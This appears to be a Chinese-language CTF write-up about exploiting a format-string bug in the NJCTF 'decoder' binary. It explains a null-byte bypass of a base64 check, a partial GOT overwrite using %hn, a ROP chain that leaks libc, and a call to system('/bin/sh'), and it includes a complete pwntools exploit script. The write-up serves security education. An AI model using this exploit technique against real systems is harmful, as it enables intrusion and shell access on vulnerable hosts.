---
title: 格式化字符串漏洞利用实战之 njctf-decoder
authorId: hac425
tags:
  - format string
  - exploit
categories:
  - ctf
date: 2017-12-17 09:51:00
---
### 前言
格式化字符串漏洞也是一种比较常见的漏洞利用技术。`ctf` 中也经常出现。

本文以 `njctf` 线下赛的一道题为例进行实战。

题目链接：https://gitee.com/hac425/blog_data/blob/master/decoder


### 正文

程序的流程如下

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15134756777207wotnxfu.png?imageslim)

部分函数已经进行了标注，看程序打印出来的提示信息就知道这个是一个 `base64` 解码的程序，然后可以通过 `猜测 + 验证` 的方式，找到那个 用于 `base64` 解码的函数。

这个程序的漏洞在于将 `base64` 解码后的字符串直接传入 `snprintf`, 作为 `format` 进行处理， 格式化漏洞。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15134762004787vfa2tjp.png?imageslim)

通过格式化串可以 **任意写/任意读** ， 不过这里一次格式化之后就会往下一种走到程序末尾。所以这里我采用 修改 `printf@got`的值 为 `rop gadgets`,然后进行 `rop`.



还需要注意前面还有`check` ,不满足 `base64` 的格式规范的字符串是触发不了漏洞的。不过我们可以绕过这些 `check`。


![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513477638571o34ns4rx.png?imageslim)


程序程序获取输入时使用的是 `read` 函数，然而后面的 `base64_check` 和 `base64_decode` 用到的输入的长度都是使用 `strlen` 获取的。`strlen` 是通过搜索 `\x00` 来确定字符串的长度， 而通过 `read` 我们可以输入 `\x00`， 所以我们在正常 `base64` 后面加上 `\x00` 然后布置 `rop chain` 即可。 
还有一个小技巧，触发漏洞时 , `printf` 函数还没有被调用，所以 `got` 表中保存的值还是没有经过 `重绑定` 的值。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513476750593syzw31hb.png?imageslim)


为了绕过栈里面的 `base64` 字符串 ，我们需要一个 `add esp` 的 `gadgets` 可以使用 `ROPgadget`.

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513476881379j7em7v3w.png?imageslim)


找到一个 `0x08048b31`, 和 `printf@got` 的值只有 `2`个字节的差距，所以使用 `%hn` 可以写两个字节，写的数据为 `0x8b31`,地址为 `0x0804B010`
```
%35633c%7$hn
```
然后后面调用 `printf` 时就会进入 `rop chain`, 首先通过 `rop` 调用 `puts` 打印 `read@got` 泄露 `libc`

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15134770899859p7k76ct.png?imageslim)

然后再次触发漏洞，用刚刚 `leak`的数据，布置 `rop` 调用 `system('/bin/sh')`

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513477156821brdloq8e.png?imageslim)

### 最后

对于 `strlen` 如果我们可以输入 `\x00`，则它的返回值我们是可以控制的。

通过部分修改 `got`，执行 `rop`，要注意后面紧跟着调用的函数。


最后的 `exp`

```
from pwn import *
context(os='linux', arch='amd64', log_level='debug')


p = process("./decoder")

gdb.attach(p, '''
b *0x08048C29
# b *0x08048C4E  
b *0x08048b31
# b *0x8048c5f  
c

	''')

pause()


printf_got = 0x0804B010
read_got = 0x0804B00C

puts_plt = 0x08048520

main_addr = 0x08048B37



s = '%35633c%7$hn'
payload = base64.b64encode(s)
payload += "\x00"  # pass check
payload += "A" * 3 # padding
payload += p32(printf_got) # addr to write
# payload += cyclic(40) # find ret eip offset
payload += cyclic(28)   # padding for eip

payload += p32(puts_plt)
payload += p32(main_addr) # ret addr, ret to main, again
payload += p32(0x0804B00C)  # addr to leak

p.sendline(payload)

p.recvuntil("THIS IS A SIMPLE BASE64 DECODER\n")

read_addr = u32(p.recv(4))
libc_addr = read_addr - 0xd5af0
system_addr = libc_addr + 0x3ada0
sh_addr = libc_addr + 1423787

log.info("system: " + hex(system_addr))
log.info("/bin/sh: " + hex(sh_addr))



s = '%35633c%7$hn'
payload = base64.b64encode(s)
payload += "\x00"  # pass check
payload += "A" * 3 # padding
payload += p32(printf_got) # addr to write
# payload += cyclic(40) # find ret eip offset
payload += cyclic(28)   # padding for eip

payload += p32(system_addr)
payload += p32(main_addr) # ret addr, ret to main, again
payload += p32(sh_addr)  # addr to leak

p.sendline(payload)




p.interactive()
```